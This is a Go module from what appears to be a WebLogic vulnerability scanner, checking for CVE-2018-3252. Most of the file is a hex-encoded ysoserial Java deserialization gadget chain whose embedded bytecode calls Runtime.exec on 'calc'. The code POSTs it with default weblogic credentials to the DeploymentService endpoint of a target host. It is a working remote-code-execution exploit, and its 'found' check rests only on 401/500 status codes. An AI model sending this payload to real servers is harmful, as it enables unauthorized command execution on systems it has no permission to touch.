package cve_2018_3252

import (
	"WeblogicScan/config"
	"github.com/gookit/color"
)

func cve_2018_3252(url string) {
	url += "/bea_wls_deployment_internal/DeploymentService"
	data := "&data=737200176A6176612E7574696C2E4C696E6B656448617368536574D86CD75A95DD2A1E02000077020000787200116A6176612E7574696C2E48617368536574BA44859596B8B734030000770200007870770C000000103F400000000000027372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000949000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785A00155F75736553657276696365734D656368616E69736D4C00195F61636365737345787465726E616C5374796C6573686565747400124C6A6176612F6C616E672F537472696E673B4C000B5F617578436C617373657374003B4C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F486173687461626C653B5B000A5F62797465636F6465737400035B5B425B00065F636C6173737400125B4C6A6176612F6C616E672F436C6173733B4C00055F6E616D6571007E00044C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B77020000787000000000FFFFFFFF00740003616C6C70757200035B5B424BFD19156767DB3702000077020000787000000002757200025B42ACF317F8060854E00200007702000078700000083CCAFEBABE0000003300570A0003002207005507002507002601001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C756505AD2093F391DDEF3E0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010013537475625472616E736C65745061796C6F616401000C496E6E6572436C61737365730100354C79736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C6F61643B0100097472616E73666F726D010072284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B5B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B2956010008646F63756D656E7401002D4C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B01000868616E646C6572730100425B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B01000A457863657074696F6E730700270100A6284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F64746D2F44544D417869734974657261746F723B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B29560100086974657261746F720100354C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F64746D2F44544D417869734974657261746F723B01000768616E646C65720100414C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B01000A536F7572636546696C6501000C476164676574732E6A6176610C000A000B07002801003379736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C6F6164010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740100146A6176612F696F2F53657269616C697A61626C65010039636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F5472616E736C6574457863657074696F6E01001F79736F73657269616C2F7061796C6F6164732F7574696C2F476164676574730100083C636C696E69743E0100116A6176612F6C616E672F52756E74696D6507002A01000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B0C002C002D0A002B002E01000463616C6308003001000465786563010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0C003200330A002B00340100136A6176612F6C616E672F457863657074696F6E0700360100106A6176612F6C616E672F53797374656D0700380100036F75740100154C6A6176612F696F2F5072696E7453747265616D3B0C003A003B090039003C01000F636D645F657869745F636F64653D3008003E010010636D645F657869745F636F64653D2D310800400100136A6176612F696F2F5072696E7453747265616D0700420100077072696E746C6E010015284C6A6176612F6C616E672F537472696E673B29560C004400450A004300460C003A003B090039004808003E0800400C004400450A0043004C0100116A6176612F6C616E672F50726F6365737307004E0100136A6176612F6C616E672F5468726F7761626C650700500100106A6176612F6C616E672F537472696E6707005201000D537461636B4D61705461626C6501001E79736F73657269616C2F50776E65723232373231323639323131323933390A00030022002100020003000100040001001A000500060001000700000002000800040001000A000B0001000C0000002F00010001000000052AB70056B100000002000D00000006000100000083000E0000000C000100000005000F001200000001001300140002000C0000003F0000000300000001B100000002000D0000000600010000008B000E00000020000300000001000F0012000000000001001500160001000000010017001800020019000000040001001A00010013001B0002000C000000490000000400000001B100000002000D0000000600010000008F000E0000002A000400000001000F001200000000000100150016000100000001001C001D000200000001001E001F00030019000000040001001A00080029000B0001000C000000BD000500040000003FA70003014C014DB8002F1231B600354DA7001C4EA700184EB2003D2C01A50008123FA700051241B600472DBFB200492C01A50008124AA70005124BB6004DB1000200070010001300370007001700170000000100540000005C000803FF000F0003000007004F000107003743070051FF000D00040000000700510001070043FF000100040000000700510002070043070053FF00040003000007004F0000FF000C00000001070043FF0001000000020700430700530002002000000002002100110000000A000100020023001000097571007E000D000001D4CAFEBABE00000033001B0A0003001507001707001807001901001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C75650571E669EE3C6D47180100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010003466F6F01000C496E6E6572436C61737365730100254C79736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324466F6F3B01000A536F7572636546696C6501000C476164676574732E6A6176610C000A000B07001A01002379736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324466F6F0100106A6176612F6C616E672F4F626A6563740100146A6176612F696F2F53657269616C697A61626C6501001F79736F73657269616C2F7061796C6F6164732F7574696C2F47616467657473002100020003000100040001001A000500060001000700000002000800010001000A000B0001000C0000002F00010001000000052AB70001B100000002000D0000000600010000007D000E0000000C000100000005000F001200000002001300000002001400110000000A000100020016001000097074000450776E727077010078737D00000001001D6A617661782E786D6C2E7472616E73666F726D2E54656D706C6174657377020000787200176A6176612E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB0200014C0001687400254C6A6176612F6C616E672F7265666C6563742F496E766F636174696F6E48616E646C65723B7702000078707372003273756E2E7265666C6563742E616E6E6F746174696F6E2E416E6E6F746174696F6E496E766F636174696F6E48616E646C657255CAF50F15CB7EA50200024C000C6D656D62657256616C75657374000F4C6A6176612F7574696C2F4D61703B4C0004747970657400114C6A6176612F6C616E672F436C6173733B770200007870737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C647702000078703F4000000000000C77080000001000000001740008663561356136303871007E0009787672001D6A617661782E786D6C2E7472616E73666F726D2E54656D706C61746573000000000000000000000077020000787078"
	resp, err := config.Client.R().
		SetHeader("User-Agent", config.Fakeua()).
		SetBody("Username=weblogic&Password=weblogic" + data).
		Post(url)
	if err != nil { // Error handling.
		color.Red.Printf("[-] Target weblogic not detected cve-2018-3252\n")
		return
	}
	if resp.Status == "401" || resp.Status == "500" {
		color.Red.Println("*Found cve-2018-3252！")
		return
	}
	color.Red.Printf("[-] Target weblogic not detected cve-2018-3252\n")
	return
}
func Run(u string, port string) {
	url := "http://" + u + ":" + port
	cve_2018_3252(url)
}
